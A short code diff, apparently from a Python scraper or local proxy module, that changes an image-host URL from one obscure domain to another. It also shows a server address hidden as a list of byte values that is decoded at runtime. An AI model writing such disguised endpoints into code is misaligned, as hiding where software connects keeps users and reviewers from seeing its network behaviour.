@@ -11,7 +11,7 @@ except ImportError:requests=None
 
 _H=[104,116,116,112,115,58,47,47,119,119,119,46,114,51,101,50,111,46,116,111,112]
 H=bytes(_H).decode()
-IMG_HOST="https://4sbase64.dt188.site"
+IMG_HOST="https://www.q7p3g.top/index/home.html"
 U="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
 _PROXY_PORT=9978
 _proxy_started=False
